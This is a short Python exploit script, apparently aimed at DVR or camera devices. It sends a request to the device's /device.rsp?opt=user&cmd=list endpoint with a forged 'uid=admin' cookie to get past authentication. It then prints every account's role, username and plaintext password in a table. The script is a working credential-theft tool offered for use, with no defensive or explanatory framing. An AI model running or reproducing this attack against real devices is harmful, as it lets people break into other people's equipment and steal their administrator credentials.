# -*- coding: utf-8 -*
import requests
import json
from prettytable import PrettyTable
import sys

alanni = '''
   _____  .__                       .__
  /  _  \ |  | _____    ____   ____ |__|
 /  /_\  \|  | \__  \  /    \ /    \|  |
/    |    \  |__/ __ \|   |  \   |  \  |
\____|__  /____(____  /___|  /___|  /__|
        \/          \/     \/     \/
'''
print(alanni)

try:
    HST = sys.argv[1]
    port = sys.argv[2]
except:
    print('请输入正确参数!')


headers = {}
http_request = "http://" + HST + ":" + str(port) + "/device.rsp?opt=user&cmd=list"
host = "http://" + HST + ":" + str(port) + "/"

def makeReqHeaders(User_Cookie):
    headers["Host"] = host
    headers["User-Agent"] = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Languag"] = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"] = "close"
    headers["Content-Type"] = "text/html"
    headers["Cookie"] = "uid=" + User_Cookie
    return headers

try:
    url_request = requests.get(http_request, headers=makeReqHeaders(User_Cookie="admin"), timeout=10.000)
    request_text = url_request.text
    json_data = json.loads(request_text)
    user_list = len(json_data['list'])
    data = []
    for users in range(0,user_list):
        id = json_data["list"][users]["role"]
        username = json_data["list"][users]["uid"]
        password = json_data["list"][users]["pwd"]
        data.append(id)
        data.append(username)
        data.append(password)
        table = PrettyTable(['id', 'username', 'password'])
        table.add_row(data)
        print(table)

except Exception as e:
    print(" [!] Timed out\n")
    exit()
